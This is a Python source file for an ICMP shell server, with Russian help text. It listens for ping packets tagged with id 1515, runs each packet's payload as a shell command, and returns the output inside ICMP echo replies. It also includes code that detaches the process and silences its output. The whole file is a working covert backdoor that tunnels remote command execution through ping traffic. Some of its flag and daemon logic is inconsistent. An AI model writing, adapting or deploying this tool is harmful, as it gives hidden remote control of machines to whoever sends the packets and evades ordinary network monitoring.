import argparse
import os
import selectors
import sys
import multiprocessing
import socket
import signal
import subprocess

from scapy.layers.inet import ICMP, IP
from scapy.sendrecv import sniff, send, sendp

import ish_open
import ishell


def ish_listen():
    child_conn, process = ish_open.popen2("echo Hello world!")
    ishell.sendhdr.cntrl = 0

    process.stdin.close()

    output = process.stdout.read()
    error = process.stderr.read()

    os.close(child_conn)
    process.communicate()

    print(output.decode('cp866'))
    print(error.decode('cp866'))


def sig_handle():
    return


def child_process():
    try:
        os.chdir("/")
    except Exception as e:
        print(f"Error changing directory: {e}")

    try:
        os.umask(0)
    except Exception as e:
        print(f"Error setting umask: {e}")

    try:
        with open(os.devnull, 'w') as null_file:
            os.dup2(null_file.fileno(), sys.stdin.fileno())

            os.dup2(null_file.fileno(), sys.stdout.fileno())

            os.dup2(null_file.fileno(), sys.stderr.fileno())

        return 0
    except Exception:
        return -1


def edaemon():
    process = multiprocessing.Process(target=child_process)

    try:
        process.start()
        process.join()
    except Exception:
        sys.exit(-1)


def packet_callback(packet):
    if ICMP in packet and packet[ICMP].type == 8 and packet[ICMP].id == 1515:
        child_conn, process = ish_open.popen2(packet[ICMP].payload.load.decode('utf-8'))
        ishell.sendhdr.cntrl = 0

        process.stdin.close()

        output = process.stdout.read()
        error = process.stderr.read()

        os.close(child_conn)
        process.communicate()

        output = output.decode('cp866')
        error = error.decode('cp866')
        print(output)
        print(error)
        if output == '':
            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / error
        else:
            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / output
        send(reply_packet)


def send_icmp_with_data(target_ip, data):
    packet = IP(dst=target_ip) / ICMP() / data
    send(packet)


def main():
    ish_debug = 0

    parser = argparse.ArgumentParser(description='ICMP Shell')

    parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
    parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')
    parser.add_argument('-t', help='Назначение типа пакетов ICMP (по-умолчанию 0)')
    parser.add_argument('-p', help='Назначение размера пакета (по-умолчанию 512)')

    args = parser.parse_args()

    if args.i:
        ishell.ish_info.id = args.i
    if args.t:
        ishell.ish_info.type = args.t
    if args.p:
        ishell.ish_info.packetsize = args.p
    if args.d:
        ish_debug = 0

    if (ish_debug):
        if edaemon():
            print("Cannot start server as daemon!")
            sys.exit(-1)

    sniff(filter="icmp", prn=packet_callback)


if __name__ == '__main__':
    main()
